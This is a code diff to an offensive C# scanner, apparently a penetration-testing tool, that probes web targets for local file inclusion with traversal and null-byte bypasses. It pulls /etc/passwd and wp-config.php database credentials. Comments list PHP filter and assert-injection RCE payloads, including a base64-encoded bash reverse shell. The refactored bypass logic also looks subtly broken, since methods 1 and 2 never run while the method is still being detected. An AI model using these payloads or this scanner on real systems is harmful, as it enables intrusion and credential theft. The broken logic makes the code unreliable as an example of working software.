@@ -13,6 +13,7 @@ namespace Reecon
         private static string initialPart = "";
         private static int notFoundLength = 0;
         private static int notFoundLength2 = 0;
+        private static int bypassMethod = -1;
 
         public static void Scan(string[] args)
         {
@@ -223,6 +224,7 @@ namespace Reecon
 
             // TODO: Null Byte each
             // TODO: Base64 Encode Each --> bla=php://filter/convert.base64-encode/resource=locationHere
+            // TODO: UTF8 Each --> bla=php://filter/convert.iconv.utf-8.ascii/resource=locationHere (Thanks spymky)
             // TODO: Assert RCE Exploit: ' and die (show_source('/etc/passwd')) or '
             // ' and die (system('echo YmFzaCAtaSAmPi9kZXYvdGNwLzE5Mi4xNjguNDkuNTYvOTAwMSA8JjE= | base64 -d | bash')) or '
             // TODO: Assert Exploit -> ', '..') === false and $myfile = fopen("/flag.txt", "r") and exit(fread($myfile,filesize("/flag.txt"))) or true or strpos('
@@ -233,76 +235,92 @@ namespace Reecon
             // ../ bypass: %2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd
             // More: https://book.hacktricks.xyz/pentesting-web/file-inclusion
 
+            // Bypass Method 0: {PATH}
+            // Bypass Method 1: /../../../../..{PATH}
+            // Bypass Method 2: /../../../../..{PATH}%00
 
             bool hasResult = false;
             foreach (string check in lfiChecks)
             {
-                bool hasResultCurrent = false;
-                // Check Base
-                string toCheck = initialPart + check;
-                try
+                // Method 0 - {PATH}
+                if (bypassMethod == -1)
                 {
-                    var requestResult = Web.GetHTTPInfo(toCheck, null);
-                    if (requestResult.AdditionalInfo == "Timeout")
+                    Console.WriteLine($"Testing: {{PATH}} with {check}");
+                }
+                if (bypassMethod == -1 || bypassMethod == 0)
+                {
+                    string toCheck = initialPart + check;
+                    bool isLFI = TestLFI(toCheck, check, 0);
+                    if (isLFI && bypassMethod == -1)
                     {
-                        Console.WriteLine("- " + toCheck + " -- Timeout :(");
-                        continue;
-                    }
-                    string result = requestResult.PageText;
-                    int resultLength = result.Length;
-                    if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length)
-                        && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length)
-                        && !result.Contains("failed to open stream"))
-                    {
-                        Console.WriteLine("- " + toCheck + " (Len: " + resultLength + ")");
-                        ParseUsefulEntries(toCheck, result);
-                        // Don't need to try more if it's already true
-                        hasResultCurrent = true;
-                        hasResult = true;
+                        bypassMethod = 0;
                     }
                 }
-                catch (Exception ex)
+                // Method 1: /../../../../..{PATH}
+                if (bypassMethod == -1)
                 {
-                    Console.WriteLine("LFI Bug - Bug Reelix: " + ex.Message);
-                    // Nope!
+                    Console.WriteLine($"Testing: /../../../../..{{PATH}} with {check}");
                 }
-                // Check with ../'s if nothing has been found for this specific result
-                if (!hasResultCurrent)
+                else if (bypassMethod == -1 || bypassMethod == 1)
                 {
-                    toCheck = initialPart + "/../../../../.." + check;
-                    try
+                    string toCheck = initialPart + "/../../../../.." + check;
+                    bool isLFI = TestLFI(toCheck, check, 15);
+                    if (isLFI && bypassMethod == -1)
                     {
-                        var requestResult = Web.GetHTTPInfo(toCheck, null);
-                        if (requestResult.AdditionalInfo == "Timeout")
-                        {
-                            Console.WriteLine("- " + toCheck + " -- Timeout :(");
-                            continue;
-                        }
-                        string result = requestResult.PageText;
-                        int resultLength = result.Length;
-                        // + 15 = Length of the bypass
-                        if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + 15)
-                            && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + 15)
-                            && !result.Contains("failed to open stream"))
-                        {
-                            ParseUsefulEntries(toCheck, result);
-                            Console.WriteLine("- " + toCheck + " (Len: " + resultLength + ")");
-                            hasResult = true;
-                        }
+                        bypassMethod = 1;
                     }
-                    catch (Exception ex)
+                }
+                // Method 2: /../../../../..{PATH}%00
+                if (bypassMethod == -1)
+                {
+                    Console.WriteLine($"Testing: /../../../../..{{PATH}}%00 with {check}");
+                }
+                else if (bypassMethod == -1 || bypassMethod == 2)
+                {
+                    string toCheck = initialPart + "/../../../../.." + check + "%00";
+                    bool isLFI = TestLFI(toCheck, check, 18);
+                    if (isLFI && bypassMethod == -1)
                     {
-                        Console.WriteLine("LFI Bug - Bug Reelix: " + ex.Message);
-                        // Nope!
+                        bypassMethod = 2;
                     }
                 }
             }
             return hasResult;
         }
 
-        private static void ParseUsefulEntries(string entry, string pageText)
+        private static bool TestLFI(string fullPath, string check, int bypassLength)
         {
-            if (entry.Contains("/etc/passwd"))
+            try
+            {
+                var requestResult = Web.GetHTTPInfo(fullPath, null);
+                if (requestResult.AdditionalInfo == "Timeout")
+                {
+                    Console.WriteLine("- " + fullPath + " -- Timeout :(");
+                    return false;
+                }
+                string result = requestResult.PageText;
+                int resultLength = result.Length;
+                if (resultLength != notFoundLength && resultLength != (notFoundLength + check.Length + bypassLength)
+                    && resultLength != notFoundLength2 && resultLength != (notFoundLength2 + check.Length + bypassLength)
+                    && !result.Contains("failed to open stream"))
+                {
+                    Console.WriteLine("- " + fullPath + " (Len: " + resultLength + ")");
+                    ParseUsefulEntries(check, result);
+                    return true;
+                }
+                return false;
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("LFI Bug - Bug Reelix: " + ex.Message);
+                return false;
+                // Nope!
+            }
+        }
+
+        private static void ParseUsefulEntries(string check, string pageText)
+        {
+            if (check == "/etc/passwd")
             {
                 if (pageText.Contains("root:x:0:0:root:/root"))
                 {
@@ -317,7 +335,7 @@ namespace Reecon
                     }
                 }
             }
-            else if (entry.EndsWith("wp-config.php"))
+            else if (check == "wp-config.php")
             {
                 if (pageText.Contains("DB_USER'") && pageText.Contains("DB_PASSWORD'"))
                 {
